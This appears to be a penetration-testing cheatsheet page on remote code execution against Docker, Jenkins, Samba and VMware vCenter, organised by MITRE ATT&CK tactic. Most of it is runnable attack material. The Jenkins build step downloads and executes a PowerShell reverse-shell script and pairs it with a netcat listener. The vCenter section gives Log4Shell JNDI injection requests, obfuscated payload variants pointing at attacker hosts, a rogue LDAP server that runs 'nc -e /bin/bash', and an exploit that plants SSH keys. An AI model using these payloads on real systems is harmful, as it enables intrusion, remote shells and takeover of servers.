---
layout: post
title: move / rce / tested
category: 05-move
parent: cheatsheets
modified_date: 2024-11-28
permalink: /move/rce
---

**Mitre Att&ck Entreprise**: 
* [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
* [T1021  - Remote Services](https://attack.mitre.org/techniques/T1021/)

**Menu**
<!-- vscode-markdown-toc -->
* [docker](#docker)
	* [administration](#administration)
	* [grype-vuln-scan-with-scan](#grype-vuln-scan-with-scan)
	* [java-maven-applications](#java-maven-applications)
	* [jdbc-client](#jdbc-client)
	* [unsecure-azure-registry](#unsecure-azure-registry)
* [jenkins](#jenkins)
* [sambacry](#sambacry)
* [vcenter](#vcenter)
	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter)
	* [CVE-2021-44228-VCenter](#CVE-2021-44228-VCenter-1)
	* [CVE-2021-21972-VCenter](#CVE-2021-21972-VCenter)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

[](assets/images/pen-ta0007-discov-t1046-scan-net-svc.png)


## <a name='docker'></a>docker

!! MUST TO READ :
- [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#summary)
- [infosecwriteups - attacking-and-securing-docker-containers](https://infosecwriteups.com/attacking-and-securing-docker-containers-cc8c80f05b5b)

### <a name='administration'></a>administration
```
docker system info
ls -alps /var/lib/docker
docker inspect | jq 
```

### <a name='grype-vuln-scan-with-scan'></a>grype-vuln-scan-with-scan

```bash
grype <image> -o template -t ~/path/to/csv.tmpl
cut -f3 -d"," grivy_output.csv > /tmp/mycve.txt
while read cve; do toto=`echo $cve | tr -d \"`; grep -i $toto /usr/share/exploitdb/files_exploits.csv; done < /tmp/mycve.txt
```

Here's what the csv.tmpl file might look like:
```bash
"Package","Version Installed","Vulnerability ID","Severity"
```

### <a name='java-maven-applications'></a>java-maven-applications 
```
# extract application
jar xf app.jar

# find Spring properties files
find . -iname "*.properties"
find -iname "*.properties" -print | xargs grep -r "://"
find -iname "*.properties" -print | xargs grep -r "jdbc.*://"
find -iname "*.properties" -print | xargs grep -r "postgresql://"
```

### <a name='jdbc-client'></a>jdbc-client
```
alias jaqy='java -Dfile.encoding=UTF-8 -Xmx256m -jar ~/jaqy-1.2.0.jar'
jaqy

# jdbc:teradata
.protocol teradata com.teradata.jdbc.TeraDriver
.classpath teradata lib/terajdbc4.jar
.open -u dbc -p dbc teradata://127.0.0.1

# jdbc:postgresql
.protocol postgresql org.postgresql.driver
.classpath postgresql lib/postgresql-42.5.3.jar
.open -u dbc -p dbc postgresql://127.0.0.1
```

### <a name='unsecure-azure-registry'></a>unsecure-azure-registry
```
curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/_catalog | jq '.repositories'
curl -s -k --user "USER:PASS" https://registry.azurecr.io/v2/<image_name>/tags/list | jq '.tags'
podman pull --creds "USER:PASS" registry.azurecr.io/<image_name>:<tag>
```

- [https://aex.dev.azure.com/me?mkt=en-US](https://aex.dev.azure.com/me?mkt=en-US)

## <a name='jenkins'></a>jenkins

* Notes for the CRTP lab:
```sh
# 01 # jenkins # log in
# 02 # jenkins # select a project
# 03 # jenkins # add a build step as "windows batch command" 
powershell.exe iex (iwr http://172.16.100.83/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.83 -Port 443
# TEST#
#powershell.exe iex ($zc2srv_ip="");
#powershell.exe iex (iwr http://${zc2srv_ip}/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress $zc2srv_ip -Port 443
#powershell.exe iex ("iwr http://"+$zc2srv_ip+"/Invoke-PowerShellTcp.ps1 -UseBasicParsing");Power -Reverse -IPAddress $zc2srv_ip -Port 443
# 04 # box # offer the download of "invoke-powershelltcp" with HFS.exe
# 05 # box # listen connecting reverse shells with "nc64.exe"
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
# 06 # jenkins # build the project
```
![move rce jenkins](/assets/images/move_rce_jenkins_crtp_1.png)
![move rce jenkins](/assets/images/move_rce_jenkins_crtp_2.png)

## <a name='sambacry'></a>sambacry

* CVE ID : CVE-2017-7494
* Date: 01/06/2017
* Snort rules : [ptresearch github](https://github.com/ptresearch/AttackDetection/blob/master/CVE-2017-7494/CVE-2017-7494.rules)
 
▶️ PLAY :
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_1.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_2.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_3.png)
![Pentest Linux Sambacry](/assets/images/pen-lin-smb-rce-2017-7494_4.png)

## <a name='vcenter'></a>vcenter

* service-port   : 
* service-process: 
* artifacts      : 

### <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228-VCenter

```bash
# install
git clone https://github.com/veracode-research/rogue-jndi.git
apt install default-jdk
apt install java-common
apt install java-package

# check if Vcenter version is vulnerable
curl -ski https://1.2.3.4/ui/login | grep Location

# tmux windows 0 splitting
Ctrl-b %
Ctrl-b ->
Ctrl-b "

## cmds to run consequently in tmux windows 1, 2 and 3 

# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

# HOOK STEP 2: run a rogue LDAP server that hook VCenter, executing netcat back to us 
sudo java -jar target/RogueJndi-1.1.jar --command "nc -e /bin/bash 1.1.1.1 4242" --hostname "1.1.1.1"

# CHECK: 1/ the LDAP, and 2/ the netcat, hooks come back
sudo tcpdump -ni eth0 host 1.2.3.4

# tmux windows 1 splitting
Ctrl-b c
Ctrl-b %
Ctrl-b ->
Ctrl-b "

# REVERSE SHELL: 
nc -lvnp 4242
```

### <a name='CVE-2021-44228-VCenter-1'></a>CVE-2021-44228-VCenter
```bash
# install

# HOOK STEP 1: rogue CURL query that hook VCenter to make an LDAP query 
curl --insecure  -vv -H "X-Forwarded-For: \${jndi:ldap://1.1.1.1:1389/o=tomcat}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${env:ENV_NAME:-j}ndi\${env:ENV_NAME:-:}\${env:ENV_NAME:-l}dap\${env:ENV_NAME:-:}//1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://1.1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

curl --insecure  -vv -H "X-Forwarded-For: \${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://1.1.1:1389/}" "https://1.2.3.4/websso/SAML2/SSO/vsphere.local?SAMLRequest="

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```

### <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972-VCenter
```bash
sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
git clone https://github.com/ptoomey3/evilarc.git
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p 'home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
python evilarc.py -d 5 -p '/home/vsphere-ui/.ssh' -o unix -f linexpl.tar /home/vsphere-ui/.ssh/id_rsa.pub
cd ../CVE-2021-21972/
sudo python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.3
python3 CVE-2021-21972.py -t 1.2.3.4
```